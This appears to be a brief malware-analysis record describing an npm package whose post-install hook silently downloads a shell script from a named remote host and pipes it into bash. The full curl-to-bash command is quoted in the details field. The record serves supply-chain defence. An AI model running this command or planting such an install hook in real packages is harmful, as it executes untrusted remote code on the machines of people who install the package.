behaviors.summary: The package contains a post-install hook that downloads and executes a remote script using curl and bash.
behaviors.details: The post-install hook in the package.json scripts section contains the commands: curl https://files.gangelov.net/cage.sh2 >/dev/null|bash&>/dev/null. This command downloads a script from a remote URL and executes it using bash.
